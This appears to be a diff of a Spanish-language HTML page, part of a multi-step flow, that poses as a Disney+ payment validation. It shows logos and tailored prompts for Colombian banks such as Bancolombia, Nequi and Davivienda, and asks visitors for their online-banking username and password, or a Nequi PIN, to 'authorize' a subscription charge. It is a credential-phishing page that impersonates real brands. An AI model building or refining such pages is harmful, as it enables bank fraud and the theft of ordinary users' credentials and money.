@@ -3,132 +3,419 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Validación Bancaria</title>
+<title>Validación Bancaria | Disney+</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
+* {
+    box-sizing: border-box;
+}
+
 body {
     margin: 0;
     background: #0f0f0f;
     font-family: 'Inter', sans-serif;
     color: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
 }
 
+/* HEADER */
+.header {
+    padding: 18px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: #0f0f0f;
+    border-bottom: 1px solid #222;
+}
+
+.header img {
+    height: 30px;
+}
+
+.header a {
+    color: #bbb;
+    font-size: 14px;
+    text-decoration: none;
+}
+
+.header a:hover {
+    color: #fff;
+}
+
+/* CONTENIDO PRINCIPAL */
 .container {
     max-width: 420px;
-    margin: 50px auto;
+    margin: 40px auto;
     background: #1a1a1a;
     padding: 30px 25px;
     border-radius: 16px;
-    box-shadow: 0 0 25px rgba(0,0,0,0.25);
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
     text-align: center;
+    flex: 1;
+}
+
+/* LOGO DEL BANCO */
+.bank-display {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 25px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #333;
+}
+
+.bank-logo-container {
+    width: 80px;
+    height: 80px;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 15px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
 }
 
 .bank-logo {
-    width: 130px;
-    margin-bottom: 18px;
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
+}
+
+.bank-info {
+    text-align: left;
 }
 
 .bank-name {
     font-size: 22px;
     font-weight: 600;
-    margin-bottom: 25px;
+    color: #00c8ff;
+    margin-bottom: 5px;
+}
+
+.bank-message {
+    font-size: 14px;
+    color: #9ca3af;
+}
+
+/* FORMULARIO */
+.form-group {
+    margin: 20px 0;
+    text-align: left;
 }
 
 label {
     display: block;
-    margin: 14px 0 5px;
+    margin: 0 0 8px 5px;
     font-size: 14px;
     color: #cccccc;
-    text-align: left;
+}
+
+.input-with-icon {
+    position: relative;
+}
+
+.input-icon {
+    position: absolute;
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #9ca3af;
+    font-size: 18px;
 }
 
 input {
     width: 100%;
-    padding: 15px;
+    padding: 15px 15px 15px 45px;
     background: #111;
     border: 1px solid #333;
-    border-radius: 6px;
+    border-radius: 8px;
     color: #fff;
     font-size: 15px;
-    margin-bottom: 15px;
+    transition: all 0.3s;
 }
 
+input:focus {
+    outline: none;
+    border-color: #00c8ff;
+    box-shadow: 0 0 0 2px rgba(0, 200, 255, 0.2);
+}
+
+input::placeholder {
+    color: #666;
+}
+
+/* BOTÓN */
 button {
     width: 100%;
-    padding: 15px;
-    background: #00c8ff;
+    padding: 16px;
+    margin-top: 25px;
+    background: linear-gradient(135deg, #00c8ff, #0099cc);
     color: #000;
     border: none;
     font-size: 17px;
     font-weight: 600;
-    border-radius: 8px;
+    border-radius: 10px;
     cursor: pointer;
-    margin-top: 5px;
+    transition: all 0.3s;
+    letter-spacing: 0.5px;
 }
 
 button:hover {
-    background: #22dbff;
+    background: linear-gradient(135deg, #22dbff, #00aadd);
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(0, 200, 255, 0.3);
+}
+
+button:active {
+    transform: translateY(0);
+}
+
+/* INFO ADICIONAL */
+.payment-info {
+    margin-top: 25px;
+    padding: 15px;
+    background: rgba(0, 200, 255, 0.05);
+    border-radius: 8px;
+    border: 1px solid rgba(0, 200, 255, 0.1);
+}
+
+.payment-info p {
+    margin: 5px 0;
+    font-size: 14px;
+    color: #9ca3af;
+}
+
+.payment-info strong {
+    color: #00c8ff;
 }
 
 /* FOOTER */
 footer {
     margin-top: 40px;
-    padding: 20px;
-    font-size: 13px;
-    color: #777;
+    padding: 25px 20px;
+    background: #0d0d0d;
+    color: #7e7e7e;
     text-align: center;
+    font-size: 13px;
+    border-top: 1px solid #222;
+}
+
+footer a {
+    color: #00c8ff;
+    text-decoration: none;
+    margin: 0 10px;
+}
+
+footer a:hover {
+    text-decoration: underline;
+}
+
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .container {
+        margin: 20px auto;
+        padding: 25px 20px;
+    }
+    
+    .bank-display {
+        flex-direction: column;
+        text-align: center;
+    }
+    
+    .bank-info {
+        text-align: center;
+    }
+    
+    .bank-name {
+        font-size: 20px;
+    }
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-
-    <!-- LOGO DEL BANCO DINÁMICO -->
-    <img id="bankLogo" class="bank-logo" src="">
-
-    <!-- NOMBRE DINÁMICO DEL BANCO -->
-    <div id="bankName" class="bank-name"></div>
-
-    <!-- FORMULARIO -->
-    <label>Usuario</label>
-    <input type="text" placeholder="Ingrese su usuario">
-
-    <label>Contraseña</label>
-    <input type="password" placeholder="Ingrese su contraseña">
-
-    <button onclick="procesar()">Validar</button>
+<!-- HEADER -->
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+">
+    <a href="paso3.html">Volver</a>
 </div>
 
+<!-- CONTENIDO -->
+<div class="container">
+    
+    <!-- DISPLAY DINÁMICO DEL BANCO -->
+    <div class="bank-display">
+        <div class="bank-logo-container">
+            <img id="bankLogo" class="bank-logo" alt="Logo Banco">
+        </div>
+        <div class="bank-info">
+            <div id="bankName" class="bank-name">Validación Bancaria</div>
+            <div class="bank-message">Ingrese sus credenciales de acceso</div>
+        </div>
+    </div>
+
+    <!-- FORMULARIO -->
+    <div class="form-group">
+        <label>Usuario / Documento</label>
+        <div class="input-with-icon">
+            <span class="input-icon">👤</span>
+            <input type="text" placeholder="Ej: usuario@banco.com" id="username">
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label>Contraseña</label>
+        <div class="input-with-icon">
+            <span class="input-icon">🔒</span>
+            <input type="password" placeholder="Ingrese su contraseña" id="password">
+        </div>
+    </div>
+
+    <!-- INFO DEL PAGO -->
+    <div class="payment-info">
+        <p>Procesando pago de: <strong id="paymentAmount"></strong></p>
+        <p>Servicio: <strong>Disney+</strong></p>
+        <p>Referencia: <strong id="paymentRef"></strong></p>
+    </div>
+
+    <!-- BOTÓN -->
+    <button onclick="procesar()">VALIDAR Y AUTORIZAR PAGO</button>
+
+</div>
+
+<!-- FOOTER -->
 <footer>
-    © 2025 Validación Bancaria. Todos los derechos reservados.
+    © 2025 Disney+. Todos los derechos reservados. · 
+    <a href="#">Términos de uso</a> · 
+    <a href="#">Política de privacidad</a> · 
+    <a href="#">Ayuda</a>
 </footer>
 
 <script>
-// LISTA DE LOGOS PARA TODOS LOS BANCOS
-const logos = {
-    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/5/5a/Logo_Bancolombia.png",
-    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/8/89/Nequi_logo_2021.png",
-    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-davivienda.png",
-    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/8/8b/BBVA_Logo.svg",
-    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/8/8e/Banco_Popular_logo.png",
-    "Banco de Bogotá": "https://upload.wikimedia.org/wikipedia/commons/8/89/Banco_de_Bogota_logo.svg",
-    "Itaú": "https://upload.wikimedia.org/wikipedia/commons/0/0a/Itau_logo.png"
+// LISTA COMPLETA DE LOGOS DE BANCOS COLOMBIANOS
+const bankLogos = {
+    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Logo_Bancolombia.png/800px-Logo_Bancolombia.png",
+    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Nequi_logo_2021.png/800px-Nequi_logo_2021.png",
+    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/54/Logo-davivienda.png/800px-Logo-davivienda.png",
+    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/BBVA_Logo.svg/800px-BBVA_Logo.svg.png",
+    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Banco_Popular_logo.png/800px-Banco_Popular_logo.png",
+    "Banco de Bogotá": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Banco_de_Bogota_logo.svg/800px-Banco_de_Bogota_logo.svg.png",
+    "Itaú": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Itau_logo.png/800px-Itau_logo.png"
 };
 
-// RECUPERAR EL BANCO SELECCIONADO
-const bank = localStorage.getItem("bankName") || "Validación";
+// TEXTO DESCRIPTIVO DE CADA BANCO
+const bankDescriptions = {
+    "Bancolombia": "Acceda con su usuario Bancolombia a la persona",
+    "Nequi": "Ingrese su número de teléfono y PIN de Nequi",
+    "Davivienda": "Usuario Davivienda Móvil o DaviPlata",
+    "BBVA": "Credenciales de BBVA Móvil o Banca Online",
+    "Banco Popular": "Usuario Banco Popular Personas",
+    "Banco de Bogotá": "Acceso Banco de Bogotá Digital",
+    "Itaú": "Credenciales Itaú Personas o Itaú Móvil"
+};
 
-// APLICAR LOGO
-document.getElementById("bankLogo").src = logos[bank] || "";
-document.getElementById("bankName").innerText = `Validación ${bank}`;
+// RECUPERAR DATOS DEL PAGO
+const selectedBank = localStorage.getItem("selectedBank") || "";
+const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
 
-function procesar() {
-    window.location.href = "procesando.html";
+// ELEMENTOS DEL DOM
+const bankLogoElement = document.getElementById("bankLogo");
+const bankNameElement = document.getElementById("bankName");
+const bankMessageElement = document.querySelector(".bank-message");
+const paymentAmountElement = document.getElementById("paymentAmount");
+const paymentRefElement = document.getElementById("paymentRef");
+
+// FUNCIÓN PARA CONFIGURAR LA PÁGINA
+function setupPage() {
+    // Configurar banco
+    if (selectedBank && bankLogos[selectedBank]) {
+        bankLogoElement.src = bankLogos[selectedBank];
+        bankLogoElement.alt = `Logo ${selectedBank}`;
+        bankNameElement.textContent = selectedBank;
+        
+        if (bankDescriptions[selectedBank]) {
+            bankMessageElement.textContent = bankDescriptions[selectedBank];
+        }
+    } else {
+        // Si no hay banco seleccionado, mostrar mensaje
+        bankLogoElement.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300c8ff'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E";
+        bankLogoElement.alt = "Banco no seleccionado";
+        bankNameElement.textContent = "Banco no seleccionado";
+        bankMessageElement.textContent = "Por favor, regrese y seleccione un banco";
+        bankMessageElement.style.color = "#ff5555";
+    }
+    
+    // Configurar información del pago
+    if (paymentData.amount) {
+        paymentAmountElement.textContent = paymentData.amount;
+    } else {
+        paymentAmountElement.textContent = "COP 24.900/mes";
+    }
+    
+    // Generar referencia única
+    const refNumber = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
+    paymentRefElement.textContent = `DISNEY-${refNumber}`;
+    
+    // Guardar referencia para usar después
+    localStorage.setItem("paymentReference", refNumber);
 }
+
+// FUNCIÓN PARA PROCESAR EL PAGO
+function procesar() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    
+    // Validación básica
+    if (!username || !password) {
+        alert("Por favor, ingrese su usuario y contraseña.");
+        return;
+    }
+    
+    if (!selectedBank) {
+        alert("Error: No se ha seleccionado un banco. Regrese al paso anterior.");
+        return;
+    }
+    
+    // Mostrar mensaje de procesamiento
+    const btn = document.querySelector("button");
+    const originalText = btn.textContent;
+    btn.textContent = "PROCESANDO...";
+    btn.disabled = true;
+    
+    // Simular procesamiento
+    setTimeout(() => {
+        // Guardar datos de autenticación (en un caso real esto iría al servidor)
+        const authData = {
+            bank: selectedBank,
+            username: username,
+            timestamp: new Date().toISOString(),
+            reference: localStorage.getItem("paymentReference"),
+            plan: paymentData.plan || "standard_ads"
+        };
+        
+        localStorage.setItem("bankAuthData", JSON.stringify(authData));
+        
+        // Redirigir a página de éxito/procesando
+        window.location.href = "procesando.html";
+    }, 1500);
+}
+
+// Inicializar página cuando se carga
+document.addEventListener('DOMContentLoaded', setupPage);
+
+// Manejar Enter para enviar formulario
+document.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        procesar();
+    }
+});
 </script>
 
 </body>
